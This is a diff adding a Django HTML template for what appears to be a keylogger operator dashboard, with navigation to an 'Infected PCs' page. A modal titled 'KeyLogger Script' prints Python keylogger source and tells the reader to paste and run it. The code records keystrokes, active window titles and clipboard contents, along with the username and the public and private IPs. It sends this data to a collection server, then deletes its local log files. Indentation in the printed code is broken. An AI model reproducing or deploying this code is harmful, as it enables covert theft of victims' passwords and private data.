@@ -1,0 +1,220 @@
+{% load static %}
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- Bootstrap CSS -->
+<link rel="stylesheet" type="text/css" href="{% static 'bootstrap.css' %}">
+
+    <title>Hello, world!</title>
+  </head>
+  <body>
+
+   <div id="mySidenav" class="sidenav">
+  <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+  <a href="/homepage">Homepage</a>
+  <a href="/infectedPCS">Infected PCs</a>
+
+</div>
+
+<div id="main">
+  <span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776; MENU</span>
+</div>
+
+
+  <div id="content">
+
+{% block content %}
+
+
+
+{% endblock %}
+  </div>
+
+
+  <script>
+function openNav() {
+  document.getElementById("mySidenav").style.width = "250px";
+  document.getElementById("main").style.marginLeft = "250px";
+  document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
+}
+
+function closeNav() {
+  document.getElementById("mySidenav").style.width = "0";
+  document.getElementById("main").style.marginLeft= "0";
+  document.body.style.backgroundColor = "white";
+}
+</script>
+
+
+
+<!-- The Modal -->
+<div id="myModal" class="modal">
+
+  <!-- Modal content -->
+  <div class="modal-content">
+    <div class="modal-header">
+      <span class="close">&times;</span>
+      <h2>KeyLogger Script</h2>
+    </div>
+    <div class="modal-body">
+      <p>Copy and paste the following lines in a Python IDE</p>
+
+      <p>from pynput.keyboard import Key, Listener</p>
+      <p>from ctypes import *</p>
+      <p>import threading</p>
+      <p>import time</p>
+      <p>import os</p>
+      <p>import sys</p>
+      <p>import win32gui</p>
+      <p>import requests</p>
+      <p>import socket</p>
+      <p>import subprocess</p>
+      <p>from winreg import *</p>
+      <p>import random</p>
+      <p>import win32clipboard</p>
+      <p>import requests</p>
+         <p>user32 = windll.user32</p>
+      <p>kernel32 = windll.kernel32</p>
+      <p>psapi = windll.psapi</p>
+      <p>ip_public = requests.get('https://api.ipify.org').text</p>
+      <p>ip_pirvat = socket.gethostbyname(socket.gethostname())</p>
+      <p>nume_utilizator = os.path.expanduser('~').split("\\")[2]</p>
+      <p>data = time.ctime(time.time())</p>
+      <p>mesaj = f'Start mesaje\n -Data:{data}\n -Nume Utilizator:{nume_utilizator}\n -Ip Privat:{ip_pirvat}\n' \
+        f'-Ip Public:{ip_public}\n '</p>
+      <p>old_app = ''</p>
+      <p>delete_file = []</p>
+         <p>class logger:</p>
+      <p>    def __init__(self):</p>
+      <p> self.fp = os.path.dirname(os.path.realpath("__file__"))</p>
+      <p>   self.file_name = sys.argv[0].split("\\")[-1]</p>
+      <p>        self.new_file_path = self.fp + "\\" + self.file_name</p>
+      <p>        self.current_window = None</p>
+      <p>        self.info = []</p>
+      <p>        self.info.append(mesaj)</p>
+      <p>        print(self.info)</p>
+      <p>        thread = threading.Thread(target=self.dumpinfo)</p>
+      <p>        thread.start()</p>
+      <p>        with Listener(on_press=self.on_press) as listener:</p>
+      <p>            listener.join()</p>
+      <p>        self.dumpinfo()</p>
+      <p>    def on_press(self,key):</p>
+      <p>        global old_app</p>
+      <p>        new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())</p>
+      <p>        new_key=key</p>
+      <p>        if new_app == 'Cortana':</p>
+      <p>            new_app = 'Windows Start Menu'</p>
+         <p>        else:</p>
+      <p>            pass</p>
+      <p>        if new_app != old_app and new_app != '':</p>
+      <p>self.info.append(f' \n [{data}] ~ {new_app}  \n')</p>
+      <p>old_app = new_app</p>
+      <p>else:</p>
+      <p>pass</p>
+      <p> substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
+                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
+                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
+                        '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
+                        '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']</p>
+      <p>key = str(key).strip('\'')</p>
+      <p>if key in substitution:</p>
+         <p>self.info.append(substitution[substitution.index(key) + 1])</p>
+      <p>if key == '\\x16':</p>
+      <p>  win32clipboard.OpenClipboard()</p>
+      <p>pasted_value = win32clipboard.GetClipboardData()</p>
+      <p> win32clipboard.CloseClipboard()</p>
+      <p>self.info.append(f' \n [Data colected from clipboard] ~ \n {pasted_value}  \n')</p>
+      <p>     else:</p>
+      <p> self.info.append(key)</p>
+      <p> def creare_fisier(self):</p>
+      <p>one = os.path.expanduser('~') + '\Downloads\\'</p>
+         <p> two = os.path.expanduser('~') + '\Pictures\\'</p>
+      <p>list = [one, two]</p>
+      <p>filepath = random.choice(list)</p>
+      <p>filename = 'I' + str(random.randint(1000000, 9999999)) + '.txt'</p>
+      <p>file = filepath + filename</p>
+      <p>return file</p>
+      <p>def dumpinfo(self):</p>
+      <p> while 1 == 1:</p>
+      <p>  time.sleep(60)</p>
+      <p> nume_fisier=self.creare_fisier()</p>
+         <p> with open(nume_fisier, 'a') as fil:</p>
+      <p>fil.write(''.join(self.info))</p>
+      <p>print(self.info)</p>
+      <p>self.sentoweb(self.info)</p>
+      <p>os.remove(nume_fisier)</p>
+      <p>self.info = []</p>
+      <p> def sentoweb(self, info):</p>
+      <p>print("datele au fost trimise: ")</p>
+      <p>value = {'nume_utilizator': nume_utilizator, 'ip_public':ip_public,'ip_privat':ip_pirvat,'data':data,'info': info}</p>
+      <p> r=requests.get("http://127.0.0.1:8000/send_data/",params=value)</p>
+         <p> print(r.text)</p>
+      <p>def main():</p>
+      <p>    t = logger()</p>
+      <p>if __name__ == "__main__":</p>
+      <p>    main()</p>
+
+    </div>
+    <div class="modal-footer">
+      <h3>Press Run!</h3>
+    </div>
+  </div>
+
+</div>
+
+
+
+  <script>
+// Get the modal
+var modal = document.getElementById("myModal");
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// When the user clicks the button, open the modal
+btn.onclick = function() {
+  modal.style.display = "block";
+}
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+
+
+</script>
+  </body>
+<footer id="footer">
+<div class="footer">
+<div class="row">
+<a href="https://github.com/SecioreanuStefanita"><i class="fa fa-github-square"></i></a>
+<a href="mailto:secioreanuionelstefanita@gmail.com"><i class="fa fa-google"></i></a>
+
+</div>
+
+<div class="row">
+<ul>
+<li><a type="button" class="btn btn-primary " href="/homepage">Homepage</a></li>
+<li><a type="button" class="btn btn-primary " href="/infectedPCS">Infected PCs</a></li>
+
+<div class="row">
+ Copyright © 2021 This is site is made as a personal project under fair use agreement
+</div>
+</ul>
+</div>
+</div>
+</footer>
+</html>
